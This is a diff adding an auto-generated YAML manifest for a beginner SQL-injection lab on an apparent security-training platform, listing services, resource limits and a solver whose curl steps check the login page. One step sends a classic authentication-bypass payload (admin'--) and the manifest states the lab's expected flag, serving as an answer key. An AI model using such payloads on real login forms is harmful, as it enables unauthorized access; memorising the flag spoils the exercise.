@@ -1,0 +1,31 @@
+# Generated from platform/labs/Web/web-2-1-basic-sql-injection-get/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-2-1-basic-sql-injection-get
+track: Web
+difficulty: beginner
+source: platform/labs/Web/web-2-1-basic-sql-injection-get/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-2-1-basic-sql-injection-get.sh
+  steps:
+  - name: Web server responds with login page
+    command: curl -s http://{target.webserver}/ | grep -o 'ShopSecure'
+    expect: ShopSecure
+  - name: Login form rejects invalid credentials
+    command: curl -s -X POST http://{target.webserver}/ -d 'username=fake&password=fake' | grep -o 'Invalid username or password'
+    expect: Invalid username or password
+  - name: SQL injection bypasses authentication and reveals flag
+    command: curl -s -X POST http://{target.webserver}/ -d "username=admin'-- &password=anything" | grep -o 'OCR{[^}]*}'
+    expect: OCR{sql_1nj3ct10n_g3t_b4s1c}
+expected_flag_count: 1
+expected_flag: OCR{sql_1nj3ct10n_g3t_b4s1c}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
